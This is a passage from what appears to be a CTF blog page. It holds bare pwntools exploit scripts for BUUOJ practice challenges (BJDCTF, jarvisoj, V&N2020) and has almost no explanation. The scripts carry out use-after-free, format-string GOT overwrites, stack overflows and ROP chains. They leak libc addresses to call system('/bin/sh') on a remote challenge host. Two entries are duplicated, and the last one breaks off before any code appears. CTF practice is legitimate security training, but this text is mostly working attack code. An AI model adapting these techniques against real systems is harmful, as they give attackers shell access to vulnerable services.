href="#NO-34-BJDCTF2nd-ydsneedgirlfriend2-solve" class="headerlink" title="NO.34 [BJDCTF2nd]ydsneedgirlfriend2_solve"></a>NO.34 [BJDCTF2nd]ydsneedgirlfriend2_solve</h1><h3 id="exp-34"><a href="#exp-34" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./[BJDCTF 2nd]ydsneedgirlfriend2&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26424</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;[BJDCTF 2nd]ydsneedgirlfriend2&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,context</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;u choice :\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input the length of her name:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please tell me her name:\n&quot;</span>)</span><br><span class="line">    p.sendline(context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;u choice :\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;u choice :\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400D86</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(backdoor))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-35-BJDCTF2nd-ydsneedgirlfriend2-solve"><a href="#NO-35-BJDCTF2nd-ydsneedgirlfriend2-solve" class="headerlink" title="NO.35 BJDCTF2nd_ydsneedgirlfriend2_solve"></a>NO.35 BJDCTF2nd_ydsneedgirlfriend2_solve</h1><h3 id="exp-35"><a href="#exp-35" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./[BJDCTF 2nd]ydsneedgirlfriend2&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26424</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;[BJDCTF 2nd]ydsneedgirlfriend2&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,context</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;u choice :\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input the length of her name:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please tell me her name:\n&quot;</span>)</span><br><span class="line">    p.sendline(context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;u choice :\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;u choice :\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400D86</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0</span>)+p64(backdoor))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-36-jarvisoj-fm-solve"><a href="#NO-36-jarvisoj-fm-solve" class="headerlink" title="NO.36 jarvisoj_fm_solve"></a>NO.36 jarvisoj_fm_solve</h1><h3 id="exp-36"><a href="#exp-36" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./jarvisoj_fm&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27403</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">0x0804A02C</span></span><br><span class="line"></span><br><span class="line">payload = p32(x)+<span class="string">&quot;%11$n&quot;</span> <span class="comment">#fmtstr_payload(offset,&#123;x:pad&#125;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-37-BJDCTF2nd-r2t4-solve"><a href="#NO-37-BJDCTF2nd-r2t4-solve" class="headerlink" title="NO.37 [BJDCTF2nd]r2t4_solve"></a>NO.37 [BJDCTF2nd]r2t4_solve</h1><h3 id="exp-37"><a href="#exp-37" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./[BJDCTF 2nd]r2t4&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26399</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;[BJDCTF 2nd]r2t4&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x00400626</span></span><br><span class="line">bss = <span class="number">0x0601050</span></span><br><span class="line">leave = <span class="number">0x004006BA</span></span><br><span class="line">__stack_chk_fail = elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;aaa%61c%9$hn%1510c%10$hn&#x27;</span>+p64(__stack_chk_fail+<span class="number">2</span>)+p64(__stack_chk_fail)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-38-BJDCTF2nd-r2t4-solve"><a href="#NO-38-BJDCTF2nd-r2t4-solve" class="headerlink" title="NO.38 BJDCTF2nd_r2t4_solve"></a>NO.38 BJDCTF2nd_r2t4_solve</h1><h3 id="exp-38"><a href="#exp-38" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./[BJDCTF 2nd]r2t4&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26399</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;[BJDCTF 2nd]r2t4&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x00400626</span></span><br><span class="line">bss = <span class="number">0x0601050</span></span><br><span class="line">leave = <span class="number">0x004006BA</span></span><br><span class="line">__stack_chk_fail = elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;aaa%61c%9$hn%1510c%10$hn&#x27;</span>+p64(__stack_chk_fail+<span class="number">2</span>)+p64(__stack_chk_fail)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-39-jarvisoj-tell-me-something-solve"><a href="#NO-39-jarvisoj-tell-me-something-solve" class="headerlink" title="NO.39 jarvisoj_tell_me_something_solve"></a>NO.39 jarvisoj_tell_me_something_solve</h1><h3 id="exp-39"><a href="#exp-39" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./jarvisoj_tell_me_something&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26222</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;jarvisoj_tell_me_something&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">good_game = <span class="number">0x000400620</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>)+p64(<span class="number">0x0400620</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-40-jarvisoj-level4-solve"><a href="#NO-40-jarvisoj-level4-solve" class="headerlink" title="NO.40 jarvisoj_level4_solve"></a>NO.40 jarvisoj_level4_solve</h1><h3 id="exp-40"><a href="#exp-40" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./jarvisoj_level4&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26528</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;jarvisoj_level4&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">offset = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system  = libc.dump(<span class="string">&#x27;system&#x27;</span>) + offset</span><br><span class="line">binsh = libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) + offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(system)+p32(main)+p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-41-jarvisoj-level3-x64-solve"><a href="#NO-41-jarvisoj-level3-x64-solve" class="headerlink" title="NO.41 jarvisoj_level3_x64_solve"></a>NO.41 jarvisoj_level3_x64_solve</h1><h3 id="exp-41"><a href="#exp-41" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./jarvisoj_level3_x64&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29849</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;jarvisoj_level3_x64&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004006b3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004006b1</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"><span class="comment">#print hex(write_plt),hex(write_got)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi) + p64(<span class="number">1</span>) </span><br><span class="line">payload += p64(pop_rsi_r15)+p64(write_got)+p64(<span class="number">0</span>)+p64(write_plt)+p64(main)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write_addr)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">offset = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system  = libc.dump(<span class="string">&#x27;system&#x27;</span>) + offset</span><br><span class="line">binsh = libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) + offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>) +p64(pop_rdi)+p64(binsh)+p64(system)+p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-42-bjdctf-2020-babystack2-solve"><a href="#NO-42-bjdctf-2020-babystack2-solve" class="headerlink" title="NO.42 bjdctf_2020_babystack2_solve"></a>NO.42 bjdctf_2020_babystack2_solve</h1><h3 id="exp-42"><a href="#exp-42" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./bjdctf_2020_babystack2&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26944</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;bjdctf_2020_babystack2&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x000400726</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>) +p64(<span class="number">0x123123</span>)+ p64(backdoor)</span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s u name?\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-43-V-amp-N2020公开赛-simpleHeap-solve"><a href="#NO-43-V-amp-N2020公开赛-simpleHeap-solve" class="headerlink" title="NO.43 [V&amp;N2020公开赛]simpleHeap_solve"></a>NO.43 [V&amp;N2020公开赛]simpleHeap_solve</h1><h3 id="exp-43"><a href="#exp-43" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 